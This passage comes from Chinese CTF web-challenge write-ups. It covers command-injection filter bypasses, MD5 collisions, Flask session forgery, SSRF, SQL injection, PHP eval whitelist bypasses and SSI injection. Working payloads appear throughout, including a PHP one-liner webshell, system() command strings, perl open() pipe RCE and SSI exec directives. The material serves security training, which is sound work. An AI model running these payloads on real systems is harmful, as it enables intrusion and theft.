        echo "over";
        ?>
    ```

- level3  空格绕过; str_ireplace()绕过

    ```php
        if(!strstr($get_flag," "))
            $get_flag = str_ireplace("cat", "wctf2020", $get_flag);
    ```

    `strstr()`函数查找字符串的首次出现，区分大小写。
    `str_ireplace()`函数替换字符串中的一些字符，不区分大小写。
    其中通过GET方式传入的变量`$get_flag`不能包含空格、cat，这样传入的变量将会被当作命令执行

    空格可以用`${IFS}`,`$IFS$[1~9]`代替

    `cat`可以用其他命令代替如，`head`, `tail`, `more`, `tac`等

最终的payload： `/fl4g.php?num=1000e1&md5=0e2159&get_flag=head$IFS$1fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag`,这只是一种写法。

## 安洵杯2019 easy_web(代码审计+MD5强碰撞)

1. `TXpVek5UTTFNbVUzTURabE5qYz0`经过`base64decode->base64decode->hexdecode`得到555.png

    用同样的方法对index.php进行编码然后替换img后面的值得到index.php页面源码

    ```php
        error_reporting(E_ALL || ~ E_NOTICE);
        header('content-type:text/html;charset=utf-8');
        $cmd = $_GET['cmd'];
        if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
            header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
        $file = hex2bin(base64_decode(base64_decode($_GET['img'])));

        //替换特殊符号
        $file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
        //不可直接读flag
        if (preg_match("/flag/i", $file)) {
            echo '<img src ="./ctf3.jpeg">';
            die("xixi～ no flag");
        } else {
            $txt = base64_encode(file_get_contents($file));
            echo "<img src='data:image/gif;base64," . $txt . "'></img>";
            echo "<br>";
        }
        echo $cmd;
        echo "<br>";
        //禁用部分函数和特殊符号
        if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
            echo("forbid ~");
            echo "<br>";
        } else {
            //MD5强比较，a和b原值不能相等，但是经过MD5加密后要想等
            if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
                echo `$cmd`;
            } else {
                echo ("md5 is funny ~");
            }
        }
    ```

2. 代码审计，对相应的地方进行绕过。

    得到源码后，img参数就没用了，可以不用管，主要就是cmd和post参数

    1. cmd参数禁用的命令可以添加反斜杠("\")或者`dir`,`sort`函数绕过，cmd后面不能直接加空格可以用"+"或者对空格编码(%20)替换

        ```sh
            sort:
            sort将文件的每一行作为一个单位相互比较，比较原则是从首字符向后依次按ASCII码进行比较，最后将它们按升序输出（就是按行排序）。
        ```

    2. MD5强碰撞：之前做的md5的题也用了md5的强碰撞（准确来讲应该叫强比较），当时是用传数组的方法通过检测的，而现在不可以这样做了，因为他多了一步强转字符串的操作，这步操作就会使数组失效，所以得找工具或者找别人提供的可以进行md5强碰撞的内容来测试了。

        这里找到两种版本，用谁都一样（仔细观察可以发现他两是一样的）

        ```url
            a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
            &b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2

            a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
            &b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
        ```

## 强网杯2019-高明的黑客(脚本编写)

一进去提示下载文件，发现有3000多个脚本，根目录下几个php脚本没什么用，考点不在这儿。主要考测试脚本的编写能力，用的网上的wp

脚本:[script_fuzz.py](./script_fuzz.py)

## MRCTF2020 PYWebsite(请求头伪造)

- **考点**
  X-Forwarded-For

- 刚进去，提示购买flag，查看网页源码，发现前端有验证,并提示了一个flag.php页面。进去，提示和ip有关，而且只有本人和购买者可以看到，所以到这里就是提示X-Forwarded-For伪造ip

  ```js
    function enc(code){
        hash = hex_md5(code);
        return hash;
        }
        function validate(){
        var code = document.getElementById("vcode").value;
        if (code != ""){
            if(hex_md5(code) == "0cd4da0223c0b280829dc3ea458d655c"){
            alert("您通过了验证！");
            window.location = "./flag.php"
            }else{
            alert("你的授权码不正确！");
            }
        }else{
            alert("请输入授权码");
        }
    }
  ```

## 攻防世界-catcat-new(flask session 伪造)

- 任意文件读取漏洞，flask框架，读取源码`app.py`
   ```python
        import os
        import uuid
        from flask import Flask, request, session, render_template
        from cat import cat

        flag = ""
        app = Flask(__name__, static_url_path='/', static_folder='static' )
        #SECRET_KEY为uuid替换-为空后加上*abcdefgh。这里刻意的*abcdefgh是在提示我们secret key的格式
        app.config['SECRET_KEY'] = str(uuid.uuid4()).replace("-", "") + "*abcdefgh"
        if os.path.isfile("/flag"):
            flag = cat("/flag")
            os.remove("/flag")
                        
        @app.route('/', methods=['GET'])
        def index():
            detailtxt = os.listdir('./details/')
            cats_list = []
            for i in detailtxt:
                cats_list.append(i[:i.index('.')])
                                                                                                                
                return render_template("index.html", cats_list=cats_list, cat=cat)

        @app.route('/info', methods=["GET", 'POST'])
        def info():
            filename = "./details/" + request.args.get('file', "")
            start = request.args.get('start', "0")
            end = request.args.get('end', "0")
            name = request.args.get('file', "")[:request.args.get('file', "").index('.')]
                                                                                        
            return render_template("detail.html", catname=name, info=cat(filename, start, end))
                                                                                        
        @app.route('/admin', methods=["GET"])
        def admin_can_list_root():
            #session为admin就能得到flag，此处需要session伪造
            if session.get('admin') == 1:
                return flag
            else:
                session['admin'] = 0
            return "NoNoNo"

        if __name__ == '__main__':
            app.run(host='0.0.0.0', debug=False, port=5637)
   ```

   破解脚本在`./script/flask_session.py`

   运行完之后脚本会输出一个secret key

   利用工具flask_session_cookie_manager伪造session,命令行运行如下命令，命令会输出一个加密后的session值，利用bp抓包伪造session获取flag。

    ```cmd
        python flask_session_cookie_manager3.py encode -s "176a7e21b5534065943ddf7a0af35eeb*abcdefgh" -t "{'admin':1}"
    ```

## CISCN2019 华东南赛区 Web4(flask session 伪造)

1. 源码

    ```python
    # encoding:utf-8
    import random
    import re
    import urllib
    import uuid

    from flask import Flask, session, request

    app = Flask(__name__)
    random.seed(uuid.getnode())
    app.config['SECRET_KEY'] = str(random.random() * 233)
    app.debug = True


    @app.route('/')
    def index():
        session['username'] = 'www-data'
        return 'Hello World! Read somethings'


    @app.route('/read')
    def read():
        try:
            url = request.args.get('url')
            m = re.findall('^file.*', url, re.IGNORECASE)
            n = re.findall('flag', url, re.IGNORECASE)

            if m or n:
                return 'No Hack'

            res = urllib.urlopen(url)
            return res.read()
        except Exception as ex:
            print str(ex)
            return 'no response'


    @app.route('/flag')
    def flag():
        if session and session['username'] == 'fuck':
            return open('/flag.txt').read()
        else:
            return 'Access denied'


    if __name__ == '__main__':
        app.run(debug=True, host="0.0.0.0")
    ```

2. 看到了一个url参数，测试发现可以读取文件，试了一下php文件发现读不出来，扫描目录后发现了console页面，猜到flask的debug。

读取源码：/app/app.py

发现是session伪造，密钥生成方法
```python
random.seed(uuid.getnode())
app.config['SECRET_KEY'] = str(random.random() * 233)
```

这里的seed使用的uuid.getnode()的值，该函数用于获取Mac地址并将其转换为整数。

对于伪随机数，如果seed固定，则随机数就会变成常数。

读取Mac地址`url=/sys/class/net/eth0/address`

用python2得出密钥。(Python2和Python3保留的位数不一样)

```python
>>> import random
>>> random.seed(0xe657d6d45b86)      
>>> print( str(random.random() * 233)) 
206.771423336
```

然后利用Flask-Session脚本解密

```cmd
F:\ProgramFiles\ctf\flask-session-cookie-manager>python flask_session_cookie_manager3.py decode -s 206.771423336 -c eyJ1
c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Zkn0QA.xWH-5EUwjzyBQf8AJ1H6J8OloeE
{'username': b'www-data'}
```

将www-data替换成fuck

```cmd
F:\ProgramFiles\ctf\flask-session-cookie-manager>python flask_session_cookie_manager3.py encode -s 206.771423336 -t "{'username': b'fuck'}"
eyJ1c2VybmFtZSI6eyIgYiI6IlpuVmphdz09In19.Zkn-mw.JhCeSGzt7rYVIh8JqNHYjpzJ078
```
拿到session。用session去访问/flag。

## SWPU2019 web(无列名注入+mysql.innodb_tabel_stats爆表名)

- 考点

  1. mysql.innodb_tabel_stats爆表名
  2. 无列名注入

- mysql.innodb_table_stats爆表名

  [其他爆表名方法](https://osandamalith.com/2020/01/27/alternatives-to-extract-tables-and-columns-from-mysql-and-mariadb/)

  ```mysql
    select group_concat(table_name) from mysql.innodb_table_stats
  ```

- 无列名注入

  e.g.

  ```mysql
    select 1,2,3 union select * from users;
    // 使用这个语句，前面的select 1，2，3 会变成列名。如果此时我们再使用下面的语句
    slecet 2 form (select 1,2,3 union select * from users)a; 
    // 就可以得到我们的第二列的所有数据
  ```

  - 下面再来分析以下此题的payload

    对了，值得注意的是这题过滤了注释符，所以我们用'来闭合语句。然后也过滤了空格，我们用/**/代替。

    ```mysql
        -1'/**/union/**/select/**/1,(select/**/group_concat(a)/**/from(select/**/1,2,3/**/as/**/a/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'
    ```

     首先我们发现总共有22个字段且第二个字段可以回显给我们，所以第二个字段突破。
     第二个字段的内容为

    `(select group_concat(a) from (select 1,2,3 as a union select*from users)x)`

    我们可以知道这里用了2种重命名方式，第一种是as 后面接别名，第二种是（）后面接别名。而group_concat只是为了把想要数据全部显示出来（一行）。

     `(select 1,2,3 as a union select*from users)`这里的第一个select就是给它们的列重命名，union后面就是得到一个重命名后的数据表，然后取别名为x。
     最后相当于`select group_concat(1,2,3) form x`从而把整个表里的数据回显。

    **注**：sql中过滤了 * 号。在无列名注入的时候 一定要和表的列数相同，不然会报错 。
    改： select 1,2,3 as a 只会把第3列重名为 a 。这次测试中必须要给重名一个列重命名否者无法正确读取数据

## CISCN2019初赛 Love Math(字符串,进制转换)

[php代码审计前奏之ctfshow之命令执行](https://www.freebuf.com/articles/web/261049.html)

  - 源码

    ```php
        <?php

        error_reporting(0);
        //听说你很喜欢数学，不知道你是否爱它胜过爱flag
        if(!isset($_GET['c'])){
            show_source(__FILE__);
        }else{
            //例子 c=20-1
            $content = $_GET['c'];
            if (strlen($content) >= 80) {
                die("太长了不会算");
            }
            $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
            foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $content)) {
                    die("请不要输入奇奇怪怪的字符");
                }
            }
            //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
            $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
            preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
            foreach ($used_funcs[0] as $func) {
                if (!in_array($func, $whitelist)) {
                    die("请不要输入奇奇怪怪的函数");
                }
            }
            //帮你算出答案
            eval('echo '.$content.';');
        }
    ```

  - 函数解释

    ```php
        preg_match_all ( string $pattern , string $subject [, array &$matches [, int $flags = PREG_PATTERN_ORDER [, int $offset = 0 ]]] ) : int
    ```

    搜索`subject`中所有匹配`pattern`给定正则表达式 的匹配结果并且将它们以`flag`指定顺序输出到`matches`中。结果排序为`$matches[0]`保存完整模式的所有匹配, `$matches[1]` 保存第一个子组的所有匹配，以此类推。

    这段代码的意思是：首先接收一个`c`, 长度还不能大于 80 。还不能有黑名单中的 空格、`\t`、`\r`、`\n`、引号、方括号。然后设置白名单，必须符合。也就是必须输入白名单中的函数。最后用`eval()`来执行并返回我们的参数。

  - **做题思路：**

    - 首先 php 允许把函数名通过字符串方式传递给一个变量，然后通过变量动态调用函数。如`$a="abc";$A()`就会执行 `abc()` 函数。

    - php 中函数名默认为字符串，可以进行异或。

### 方法一

    想办法构造`$_GET[1]`再传参getflag，但是其实发现构造这个很难。。。因为`$`、`_`、`[`、`]`都不能用，同时GET必须是大写，很难直接构造。

    先看一下用到的一些数学函数：

    ```php
        base_convert ( string $number , int $frombase , int $tobase ) : string
    ```

    返回一字符串，包含 `number` 以 `tobase` 进制的表示。`number` 本身的进制由 `frombase` 指定。`frombase` 和 `tobase` 都只能在 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。意思就是将输入数字的进制进行转换。

    可以使用这个函数将其他进制数转为36进制，而是36进制是包含所有数字和小写字母的。但终究无法构造`GET`大写字母。但又可以构造其他的小写字母函数，让构造的函数转换。

    ```php
        hexdec ( string $hex_string ) : number    //十六进制转换为十进制
        dechex ( int $number ) : string        //十进制转换为十六进制
        bin2hex ( string $str ) : string    //函数把包含数据的二进制字符串转换为十六进制值
        hex2bin ( string $data ) : string    //转换十六进制字符串为二进制字符串
    ```

    那么我们就可以想象一下，把`_GET`先利用`bin2hex()`转换为 十六进制，在利用`hexdec()`转换为十进制，那么反过来就可以把一段数字转换为字符。

    但是`binhex()`， `hexdec()`等不是白名单的函数，要从哪里来？

    这时候就要看`base_convert()`的作用了，因为上面的函数都是小写的，所以可以利用此函数将一个十进制数的数字转为三十六进制的小写字符。这里三十六进制是10个数字+26个小写字母，因此能够完整表示出一个函数名的所有字符。

    那么怎么才能直到这个数呢？我们可以先逆向将三十六进制字符转换为十进制数，得到该数字，最终逆向构造即可。

    ```php
        base_convert('hex2bin',36,10);        //37907361743
        base_convert(37907361743,10,36);    //hex2bin
    ```

    再将`_GET`反向构造出来：

    ```php
        bin2hex('_GET');    //得到 5f474554 将字符转换为十六进制
        hexdec('5f474554');    //得到 1598506324 将十六进制转为十进制
        dechex(1598506324);        //得到 5f474554 将十进制转换为十六进制
        hex2bin('5f474554');    //得到 _GET
    ```

    白名单中有`dechex()`、`hexdec()`函数，但是没有`hex2bin()`、`bin2hex()`函数，但是我们可以使用`base_convert()`函数构造任意小写函数。

    可以用`{}`代替`[]`构造

    ```php
        ?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi{abs})($$pi{acos})&abs=system&acos=ls
        // $pi=_GET;($_GET[abs])($_GET[acos])    ==> $pi=_GET;(system)(ls)
        //得到 _GETflag.php index.php
        
        ?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi{abs})($$pi{acos})&abs=system&acos=cat flag.php
        //得到flag
    ```

### 方法二

  可以构造`getallheaders()`传参，此是小写的，可以直接用base_convert转换。

  ```php
    getallheaders ( void ) : array
  ```

  获取全部 `HTTP` 请求头信息。

  首先构造`system`和`getallheaders`：

  ```php
    base_convert('getallheaders',30,10);
    //得到8768397090111664438，这里不使用36进制是因为精度会丢失，尝试到30的时候成功
    base_convert('system',36,10);    //得到1751504350
  ```

  payload:

  ```php
    ?c=$pi=base_convert;$pi(1751504350,10,36)($pi(8768397090111664438,10,30)(){1})
    HEADER:    1:cat flag.php
  ```

### 方法三

  1. 直接`cat f*`

    ```php
        echo dechex(16)^asinh^pi;        //输出*
        base_convert('cat',36,10);        //得到15941
        base_convert('system',36,10);        //得到1751504350
    ```

payload:

    ```php
        ?c=base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))
        //system('cat'.dechex(16)^asinh^pi) => system('cat *')
    ```

  2. 或者：

  ```php
    hexdec(bin2hex('cat f*'));        //得到109270211257898
    base_convert('exec',36,10);        //得到696468
  ```

  payload:

  ```php
    ?c=($pi=base_convert)(696468,10,36)($pi(76478043844,9,34)(dechex(109270211257898)))
    
    //exec('hex2bin(dechex(109270211257898))') => exec('cat f*')
  ```

  这里发现一个问题，这个payload超过了80的长度限制，所以只能把三十四进制转换为二十三进制。

  ```php
    ?c=($pi=base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))
  ```

### 方法四

前面都是利用白名单的数学函数将数字转成字符串，其实也可以异或构造这是fuzz脚本

```php
    <?php
    $payload=['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh',  'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    for($k=1;$k<=sizeof($payload);$k++){
        for($i=0;$i<9; $i++){
            for($j=0;$j<=9;$j++){
                $exp=$payload[$k] ^$i.$j;
                echo($payload[$k]."^$i$j"."==>$exp");
                echo"<br />";
            }
        }
    }
```

得到`is_nan^64==>_G`和`tan^15==>ET`

payload:

```php
    ?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&0=system&1=cat flag.php
    //$pi=_GET;$pi=$_GET;$_GET[0]($_GET[1])&0=system&1=cat flag.php     ==> system(cat flag.php)
```

## De1CTF SSRF Me(代码审计)

源码

```python
    #! /usr/bin/env python 
    #encoding=utf-8 
    from imp import reload
    from flask import Flask 
    from flask import request 
    import socket 
    import hashlib 
    import urllib
    import sys 
    import os 
    import json 
    reload(sys)
    # sys.setdefaultencoding('latin1') 
    app = Flask(__name__) 
    secert_key = os.urandom(16) 
    class Task: 
        def __init__(self, action, param, sign, ip): 
            self.action = action 
            self.param = param 
            self.sign = sign 
            self.sandbox = hashlib.md5(ip) 
            if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr 
                os.mkdir(self.sandbox) 
        
        def Exec(self): 
            result = {} 
            result['code'] = 500 
            if (self.checkSign()): 
                if "scan" in self.action:
                    tmpfile = open("./%s/result.txt" % self.sandbox, 'w')
                    resp = scan(self.param) 
                    if (resp == "Connection Timeout"): 
                        result['data'] = resp 
                    else: 
                        print(resp)
                        tmpfile.write(resp) 
                        tmpfile.close() 
                        result['code'] = 200 
                if "read" in self.action: 
                            f = open("./%s/result.txt" % self.sandbox, 'r') 
                            result['code'] = 200 
                            result['data'] = f.read() 
                if result['code'] == 500: 
                    result['data'] = "Action Error" 
                else: 
                    result['code'] = 500 
                    result['msg'] = "Sign Error" 
                return result 
        def checkSign(self): 
            if (getSign(self.action, self.param) == self.sign): 
                return True 
            else: 
                return False 

    #generate Sign For Action Scan. 
    @app.route("/geneSign", methods=['GET', 'POST']) 
    def geneSign(): 
        # urllib.unquote 是url解码   ----urlib.urlencode 是url编码  #request.args.get获取单个值
        param = urllib.unquote(request.args.get("param", ""))
        action = "scan" 
        return getSign(action, param) 

    @app.route('/De1ta',methods=['GET','POST']) 
    def challenge(): 
        action = urllib.unquote(request.cookies.get("action")) 
        param = urllib.unquote(request.args.get("param", "")) 
        sign = urllib.unquote(request.cookies.get("sign")) 
        ip = request.remote_addr 
        if(waf(param)): 
            return "No Hacker!!!!" 
        task = Task(action, param, sign, ip) 
        return json.dumps(task.Exec()) 

    @app.route('/') 
    def index(): 
        return open("code.txt","r").read() 

    def scan(param): 
        socket.setdefaulttimeout(1) 
        try: 
            return urllib.urlopen(param).read()[:50] 
        except: 
            return "Connection Timeout" 

    def getSign(action, param): 
        return hashlib.md5(secert_key + param + action).hexdigest() 

    def md5(content): 
        return hashlib.md5(content).hexdigest() 

    def waf(param): 
            check=param.strip().lower() 
            if check.startswith("gopher") or check.startswith("file"): 
                return True 
            else:  
                return False 

    if __name__ == '__main__': 
        app.debug = False 
        app.run(host='0.0.0.0',port=80) 
```

- 题目一开始就提示flag在/flag.txt中,然后题目又是SSRF

1. 首先看`geneSign`页面,url解码,获取param参数(这里get,post请求都可以),接着`action=scan`,然后返回`getSign`函数,`gerSign`函数->生成加密sign值,用于后续比较

2. 再看De1ta页面,可以发现`action`和`sign`存放在cookie中，而`param`则是get/post参数。

   `param`会经过`waf`,`waf`会过滤`gopher`和`file`,经过`waf`之后会调用`Exec`方法。
   
   `Exec`首先会调用`checkSign`函数(需要`action`和`param`通过`getSign`方法后的值与`sign`相同。)
   
   如果`scan`在`action`里面，会将`param`传入`scan`函数调用,`scan`函数会抓取`param`这个页面并读取,然后将结果保存到一个文件中。
   
   如果`read`也在`action`中，则会读取结果，并放到`result`字典中。然后返回这个字典。
   
   而`De1ta`页面最终会将结果打印出来。

3. 到现在就清楚了，首先需要`param=flag.txt`,同时又要`action`中包含`sign`和`read`, 而在`geneSign`函数中`action=scan`,我们需要构造一个包含`read`的payload,再看`getSign`函数,`param`和`action`的顺序正好是`hashlib.md5(secert_key + param + action).hexdigest()`,所以可以`param=flag.txtread`,这样就等于`param=flag.txt`,`action=readscan`。
   
   获取到`sign`后，bp抓包伪造cookie以及param就能拿到flag，

   *注意*：cookie中`action=readscan`

## HITCON2017 SSRFme

1. 考点
   - SSRF
   - perl语言漏洞

2. 代码审计

    ```php
    <?php
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        # explode 使用一个字符串分割另一个字符串,并以数组形式返回
        $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];
    }

    echo $_SERVER["REMOTE_ADDR"];
    # $sandbox 的值为 sanbox/(orangexx.xx.xx.xx md5加密后的值)
    $sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]);
    # 以$sandbox的值创建路径
    @mkdir($sandbox);
    # 进入路径
    @chdir($sandbox);
    # shell_exec 执行命令
    # escapeshellarg 把字符串转码为可以在 shell 命令里使用的参数
    # 
    $data = shell_exec("GET " . escapeshellarg($_GET["url"]));
    # 返回文件路径的信息 文件名可以通过GET["filename"]传参
    $info = pathinfo($_GET["filename"]);
    # basename($info["dirname"])
    # basename 返回路径中的文件名部分
    # $info["dirname"] 返回路径中的目录部分
    # 将 xxx 字符串中的 .  替换成 ''
    $dir  = str_replace(".", "", basename($info["dirname"]));
    # 创建文件夹
    @mkdir($dir);
    # 进入文件夹
    @chdir($dir);
    # 写入文件
    # 将$data 写入 basename($info["basename"] 文件中
    @file_put_contents(basename($info["basename"]), $data);
    highlight_file(__FILE__);
    ```

3. 解题

    **方法一--传木马用蚁剑连接**

    1. SSRF配合PHP伪协议

        payload:
        ```php
        ?url=data:text/plain,<?php%20@eval($_POST["cmd"]);?>&filename=aaa/aaa.php
        ```
    2. 服务器传马

        在vps上绑定一句话木马进行监听，然后通过GET命令去请求，用$_GET[“filename”]传入的值作为文件名保存。

        服务器上写马，用python启动一个http服务
        ```python
        python3 -m http.server
        ```
        payload:
        ```php
        ?url=xx.xx.xx.xx:port/xxx.php&filename=xxx.php
        ```
    木马上传完成以后去存放木马的路径访问，然后用蚁剑连接，直接访问文件拿不到flag。用蚁剑打开虚拟终端，在命令行执行`./readflag`

    **方法二--perl语言漏洞**

    因为GET函数在底层调用了perl语言中的open函数，但是该函数存在rce漏洞。当open函数要打开的文件名中存在管道符（并且系统中存在该文件名），就会中断原有打开文件操作，并且把这个文件名当作一个命令来执行。

    1. 先创建文件
        ```url
        ?url=&filename=ls /|
        ?url=&filename=|/readflag
        ```
    2. 执行命令
        ```url
        ?url=file:ls /|&filename=a
        ?url=file:|/readflag&filename=a
        ```

## [BJDCTF2020] EasySearch (SSI-Server-Side Includes Injection（服务端包含注入）)

1. 进入靶场之后用bp的Intruder尝试过爆破，但是没有什么效果。然后考虑**目录扫描**，会得到一个`index.php.swp`,这是一个备份文件，这种备份文件产的原因主要是线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。

   - 非正常关闭vim编辑器时会生成一个.swp文件

       在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容。

       以 `index.php` 为例：第一次产生的交换文件名为 `.index.php.swp`

       再次意外退出后，将会产生名为 `.index.php.swo` 的交换文件

       第三次产生的交换文件则为 `.index.php.swn`

   - 但是如果用dirsearch常规扫描是扫不出来的，需要用包含这几个名称的自定义字典扫描。

   访问`index.php.swp`得到源码

   ```php
       <?php
           ob_start();
           function get_hash(){
               $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
               $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
               $content = uniqid().$random;
               return sha1($content); 
           }
           header("Content-Type: text/html;charset=utf-8");
           ***
           if(isset($_POST['username']) and $_POST['username'] != '' )
           {
               $admin = '6d0bc1';
               if ($admin == substr(md5($_POST['password']),0,6)) {
                   echo "<script>alert('[+] Welcome to manage system')</script>";
                   $file_shtml = "public/".get_hash().".shtml";
                   $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
                   $text = '
                   ***
                   ***
                   <h1>Hello,'.$_POST['username'].'</h1>
                   ***
                   ***';
                   fwrite($shtml,$text);
                   fclose($shtml);
                   ***
                   echo "[!] Header  error ...";
               } else {
                   echo "<script>alert('[!] Failed')</script>";
               }        
           }else{
               ***
           }
           ***
       ?>
   ```

2. 登录验证那一块要求是密码经过`md5`加密后要和`6d0bc1`相等,用下面的脚本可以找到几个。

    ```python
        import hashlib

        resPath = f'd:\\desktop\ctf\\buu\\web\\script-data\\md5-value.txt'

        with open(resPath,'w') as f:

            for i in range(10000000):
                md5 = hashlib.md5(str(i).encode("utf-8")).hexdigest()
                f.write(f'{str(i):10} | {md5}')
                f.write("\n")
    ```

3. 接下来就是 SSII

    - SHTML文件扩展信息

        服务器端内嵌（Server Side Includes，亦简称为SSI）是一种大多数仅应用于互联网上的简单解释性服务器端脚本语言。Apache、LiteSpeed、Nginx、Lighttpd与IIS五大主流网页服务器软件均支持此种语言。

        SHTML是一种用于SSI技术的网页文件。SHTML和.ASP网页有一些相似，SHTML文件里使用了SSI的一些指令，就像ASP中的指令，当客户端访问这些SHTML文件时，服务器端会把这些SHTML文件进行读取和解释，把SHTML文件中包含的SSI指令解释出来，返回静态网页。

        例如，你可以在SHTML文件中用SSI指令引用其他的.HTML文件（#include命令），服务器传送给客户端的文件，是已经解释的SHTML，不会有SSI指令。它实现了HTML所没有的功能，就是实现了动态的SHTML，可以说是HTML的一种进化。

        使用SSI指令可以更方便管理和维护网站。网站维护常常碰到的一个问题是，网站的结构已经固定，却为了更新一点内容而不得不重做一大批网页。SSI提供了一种简单、有效的方法来解决这一问题，它将一个网站的基本结构放在几个简单的HTML文件中（模板），以后我们要做的只是将文本传到服务器，让程序按照模板自动生成网页，从而使管理大型网站变得容易。

        因为包含SSI指令的文件要求特殊处理，所以必须为所有SSI文件赋予SSI文件扩展名，默认扩展名是.stm、.shtm和.shtml。

    - SSI用途

        - 显示服务器端环境变量<#echo>
        - 将文本内容直接插入到文档中<#include>
        - 显示WEB文档相关信息<#flastmod #fsize>（如文件制作日期/大小等）
        - *直接执行服务器上的各种程序<#exec>*（如CGI或其他可执行程序）
        - 设置SSI信息显示格式<#config>（如文件制作日期/大小显示方式）高级SSI<XSSI>可设置变量使用if条件语句。

    `.shtml`可以执行命令，格式：

    ```html
        <!--#exec cmd="ls" -->
    ```
    
    所以此处可以使`username`为想要执行的命令。用bp抓包，会发现响应头中有访问链接，访问之后发现命令成功执行。以这种方式就可以得到flag。

## 无数字字母shell

[一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)

### [极客大挑战] RCE ME(无数字字母绕过+dis_function绕过)

  无数字字母绕过 + 环境变量 `LD_preload + mail`劫持so执行系统命令

  [bypass disfunction](https://ab-alex.github.io/2019/11/20/bypass-disfunction/)

1. 无数字字母绕过

    采用异或 或者 取反绕过，这道题采用取反，因为有长度限制,取反代码

    ```php
        <?php

        $cmd = 'assert';
        $payload = urlencode(~ $cmd);
        echo $payload;
        echo "\n";
        $a = 'eval($_POST["cmd"])';
        echo urlencode(~$a);

        ?>

    ```
取反之后,在url中写法`?code=(~%8F%97%8F%96%91%99%90)();`,即取反的内容要用"()"括起来

url解码之后就是 `?code=phpinfo();`

1. 命令执行绕过

